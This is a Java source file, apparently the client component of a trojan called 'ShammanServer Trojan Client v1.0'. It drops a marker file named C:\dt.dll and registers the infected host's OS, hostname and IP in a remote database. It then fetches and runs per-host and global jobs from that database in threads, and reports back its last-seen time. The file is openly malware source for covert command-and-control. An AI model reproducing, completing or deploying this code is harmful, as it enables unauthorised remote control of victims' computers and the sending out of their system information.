/**
 * @author Marin Florin
 * ShammanServer Trojan Client v1.0
 */

// Local file handle library

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

// Get IP Address
import java.net.InetAddress;

// Generate UUID 
import java.util.UUID;

// Wait
import java.util.concurrent.TimeUnit;



/************** Main Class  ************/   
public class main{
	// Write object to disk
	public static void serializeDataOut(Object ish, String fileName)throws IOException{
	    FileOutputStream fos = new FileOutputStream(fileName);
	    ObjectOutputStream oos = new ObjectOutputStream(fos);
	    oos.writeObject(ish);
	    oos.close();
	}
	
	// Read object from disk
	public static Object serializeDataIn( String fileName ) throws IOException, ClassNotFoundException{
	   FileInputStream fin = new FileInputStream(fileName);
	   ObjectInputStream ois = new ObjectInputStream(fin);
	   Object ThatSys= (Object) ois.readObject();
	   ois.close();
	   return ThatSys;
	}
	
	// sys value is to parse local object
	static void executeJobs( String[] myJobs, thatSys sys ){
		
		String[] arg= new String[5];
		int addArg= 0;
		int lastStart= 2;
		Boolean err = false;
		
		for(int i= 0; i< 3; i++){
			if ( myJobs[i] != "" ){
				if( myJobs[i].length() > 2  ){
					for(int j=2; j< myJobs[i].length(); j++ ){
						if( myJobs[i].charAt(j) != '/' || myJobs[i].length() == j ){
							arg[ addArg++ ]= myJobs[i].substring(lastStart, j+1) ;
							continue ; 
						}
						else{	
							arg[ addArg++ ]= myJobs[i].substring(lastStart, j);
							lastStart= j+1;
						}
					}
				}
				//Job job= new Job( sys );
				//job.execute( myJobs[i].charAt(0), arg );
				
				(new Thread(new Job( sys, myJobs[i].charAt(0), arg ))).start();
				
			}
		}
	}
	
	static void getFromDatabase(dbManager DB, thatSys sys){
		String result;
		String result2;
		for(int i= 0; i<3; i++){
			// Interogate db
			result= DB.bdInterogate(true, "SELECT * FROM hosts WHERE UUID ='"+ sys.UUID +"';", "myJobs_"+ i); 
			result2= DB.bdInterogate(true, "SELECT * FROM hosts WHERE ID ='1';", "myJobs_"+ i); 
			
			// Handle DB Errors
			if(result == "BAD" || result2 == "BAD" ){ 
				thatSys.isOnline= false;
				if( thatSys.DEBUG ) prt( " No DB Connection!" );
				
			}
			else if( result == "NO_CON" || result2 == "NO_CON" ){
				thatSys.errorLevel= 2;
				if( thatSys.DEBUG ) prt( " Field error!" );
				
			}
			
			else{
				thatSys.myJobs[i]= result;
				thatSys.globalJob[i]= result2;
				thatSys.isOnline= true;
				thatSys.errorLevel= 0;
			}
		}
	}
	
	
	static void waitToConnect( dbManager DB) throws InterruptedException{
		 int tryToConnectTime= 1;
		 do{
			 if( thatSys.DEBUG ) prt("*");
			 
			 String result = DB.bdInterogate(true, "SELECT * FROM hosts WHERE ID ='1';", "myJobs_1");
			 if( result != "BAD" ) thatSys.isOnline= true; 
			 TimeUnit.SECONDS.sleep( tryToConnectTime );
			 
		 } while( !thatSys.isOnline );
		 
	}
 // Make System.out.println smaller
	static void prt( String s ){ System.out.println( s ); }
	
	
	
	
	
	
	
	/*************** Start main method *****/
	public static void main( String[] args ) throws IOException, ClassNotFoundException {
	// Local save file name and location
		final String fileName= "C:\\dt.dll"; 
		thatSys.isOnline= false;
		
	
		
		
	// Verify if session object exist
		File f = new File( fileName );
		dbManager DB = new dbManager();
	// if PC is infected
		if( !f.exists() ){
			// Create local file
			thatSys sys= new thatSys();
			sys.UUID = UUID.randomUUID().toString();
			
			serializeDataOut(sys, fileName);
			if( thatSys.DEBUG ) prt("Local File created!");
			
		//Add system informations to db
			DB.bdInterogate(false, "INSERT INTO `hosts`"+ 
			"(`ID`, `UUID`, `addDate`, `LastTimeOnline`, `OS`, `hostName`, `CPU`, `RAM`, `IP`, `myJobs_0`, `myJobs_1`, `myJobs_2`, `errorLevel`)"+
			" VALUES (NULL, '"+ 
			sys.UUID +"', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, '"+ 
			System.getProperty("os.name") +"', '"+
			InetAddress.getLocalHost().getHostName() +"', '12', '12', '"+ 
			InetAddress.getLocalHost().getHostAddress() +"', '', '', '', '0');", "");
			
			
			
		}
		
	// Get local settings from local file
		thatSys sys= (thatSys) serializeDataIn( fileName );
		if( thatSys.DEBUG )  prt( " System UUID is: "+ sys.UUID);
	
		
		
	
	// Get jobs from database
		getFromDatabase(DB, sys);
		
	// If not DB connection connection exist wait until is connected
		if( !thatSys.isOnline ){
			if( thatSys.DEBUG ) prt(" Try to estabilish db connection ... ");
			try { waitToConnect( DB ); } catch (InterruptedException e) { e.printStackTrace(); }
			getFromDatabase(DB, sys);
			
		}
		
		
	// Execute jobs
		if( thatSys.DEBUG ) prt(" Connection estabilished, execute jobs ... ");
		executeJobs( thatSys.myJobs, sys );
		executeJobs( thatSys.globalJob, sys );

		// Print error level
		if( thatSys.DEBUG ) prt(" System error level is:  "+ thatSys.errorLevel);
		
		
		
		
		
		// Update DataBase
		DB.bdInterogate(false, "UPDATE `hosts` SET `LastTimeOnline` = CURRENT_TIMESTAMP, `errorLevel` = '"+ thatSys.errorLevel +
		"' WHERE `hosts`.`UUID` = '"+ sys.UUID +"';", "");
		// Update local file
		serializeDataOut(sys, fileName);
	}
}
